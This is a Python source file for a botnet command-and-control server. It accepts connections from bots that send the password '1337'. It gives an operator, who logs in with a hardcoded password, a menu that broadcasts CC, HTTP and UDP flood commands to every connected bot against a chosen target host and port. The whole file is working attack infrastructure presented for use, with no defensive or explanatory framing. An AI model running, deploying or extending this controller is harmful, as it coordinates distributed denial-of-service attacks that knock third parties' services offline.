#!/usr/bin/env python3
# -*- coding: UTF-8 -*-
#Code by LeeOn123
#Improved at 14/7/2019
#====================================================================#
# ____        _   _                   ____        _              _   #
#|  _ \ _   _| |_| |__   ___  _ __   | __ )  ___ | |_ _ __   ___| |_ #
#| |_) | | | | __| '_ \ / _ \| '_ \  |  _ \ / _ \| __| '_ \ / _ \ __|#
#|  __/| |_| | |_| | | | (_) | | | | | |_) | (_) | |_| | | |  __/ |_ #
#|_|    \__, |\__|_| |_|\___/|_| |_| |____/ \___/ \__|_| |_|\___|\__|#
#       |___/                                                        #
#====================================================================#

import socket
import argparse
import threading
import os
import time
import sys
from os import system, name

password = "Leeon123"#Your login password

if len(sys.argv)<=1:
	print("Usage: python3 cnc.py <port>")
	sys.exit()

b = int(sys.argv[1])

socketList = []
def sendCmd(cmd):#Send Commands Module
	print('[*]Command sent!!!')
	print(cmd)
	for sock in socketList:
		try:
			s.settimeout(1)
			sock.send(cmd.encode())
		except:
			socketList.remove(sock)#del error connection
			print("[!] A bot offline")

def showbot():
	while True:
		try:
			so.send(("\033]0;Nodes : "+str(len(socketList))+" \007").encode())
			time.sleep(1)
		except:
			return

def handle_bot(sock,socketList):
	while True:
		try:
			sock.send("ping".encode())#keepalive and check connection
			print("ping")
			pong = sock.recv(1024).decode()
			if pong == "pong":
				print("pong")
				time.sleep(10)
		except:
			try:
				sock.close()
				socketList.remove(sock)
				print("[!] A bot offline")
			except:
				pass

def waitConnect(sock,addr):
	passwd = sock.recv(1024).decode()
	if passwd == "1337" :
		if sock not in socketList:
			socketList.append(sock)
			print("[!] A bot Online "+ str(addr)) #Loading scene :)
			handle_bot(sock,socketList)
	elif passwd == password + "\r\n" or passwd == password:
		print("Commander is here")
		Commander(sock)

def Commander(sock):
	global so
	so = sock
	sock.send("Setting up the server\r\n".encode())
	time.sleep(0.5)
	sock.send("\033[2J\033[1H".encode())
	sock.send("Setting up the server [-]\r\n".encode())
	time.sleep(0.3)
	sock.send("\033[2J\033[1H".encode())
	sock.send("Setting up the server [\]\r\n".encode())
	time.sleep(0.3)
	sock.send("\033[2J\033[1H".encode())
	sock.send("Setting up the server [-]\r\n".encode())
	time.sleep(0.3)
	sock.send("\033[2J\033[1H".encode())
	sock.send("Setting up the server [/]\r\n".encode())
	time.sleep(0.3)
	sock.send("\033[2J\033[1H".encode())
	sock.send("Setting up the server [-]\r\n".encode())
	time.sleep(0.3)
	sock.send("\033[2J\033[1H".encode())
	sock.send("Setting up the server [\]\r\n".encode())
	time.sleep(0.3)
	sock.send("\033[2J\033[1H".encode())
	sock.send("Setting up the server [-]\r\n".encode())
	time.sleep(0.3)
	sock.send("\033[2J\033[1H".encode())
	sock.send("Setting up the server [/]\r\n".encode())
	time.sleep(0.3)
	sock.send("\033[2J\033[1H".encode())
	sock.send("[!] Setting Up Connection Socket...\r\n".encode())
	time.sleep(0.5)
	sock.send("[!] Updating Server Config...\r\n".encode())
	time.sleep(0.5)
	sock.send("[!] Setting Up C&C Module...\r\n".encode())
	time.sleep(0.5)
	sock.send("[!] Done...\r\n".encode())
	time.sleep(0.5)
	sock.send("[!] Welcom to the Python3 C&C Server, glhf !!!\r\n".encode())
	sock.send("==============================================\r\n".encode())
	time.sleep(1)
	botn = threading.Thread(target=showbot)
	botn.start()


	while True:
		#print ("==> Python3 C&C server <==")
		sock.send('ルート@ボットネット:'.encode())
		cmd_str = sock.recv(1024).decode()
		if len(cmd_str):
			if cmd_str[0] == '!':
				sendCmd(cmd_str)
			if cmd_str == '?' or cmd_str == 'help' or cmd_str == '?\r\n' or cmd_str == 'help\r\n':
				sock.send('\r\n#-- Commands --#\r\n'.encode())
				sock.send('  CC   Flood: !cc   host port threads\r\n'.encode())
				sock.send('  HTTP Flood: !http host port threads path\r\n'.encode())
				sock.send('  UDP  Flood: !udp  host port threads size\r\n\r\n'.encode())
				sock.send('    !stop    : stop attack\r\n'.encode())
				sock.send('    bots     : show bots info\r\n'.encode())
				sock.send('    clear    : Clear screen\r\n'.encode())
				sock.send('    exit     : exit the server\r\n'.encode())
				sock.send('    shutdown : shutdown the server\r\n'.encode())
				sock.send('=============================================================\r\n'.encode())
			if cmd_str == 'bots' or cmd_str == 'bots\r\n':
				sock.send(("Nodes:"+str(len(socketList))+"\r\n").encode())
			if cmd_str == 'clear' or cmd_str == 'clear\r\n':
				sock.send("\033[2J\033[1H".encode())
			if cmd_str == 'exit' or cmd_str == 'exit\r\n':
				sock.send('Bye, ルート\r\n'.encode())
				stop = True
				sock.close()
				break
			if cmd_str == 'shutdown' or cmd_str == 'shutdown\r\n':
				sock.send('Shutdown\r\n'.encode())
				stop = True
				sock.close()
				print("shutdown from remote command")
				sys.exit()

def main():
	global s
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)#Keepalive tcp connection
	s.bind(('0.0.0.0',b))
	s.listen(1024)
	while True:
		sock, addr = s.accept()
		th = threading.Thread(target=waitConnect,args=(sock,addr))
		th.start()

if __name__ == '__main__':
	main()
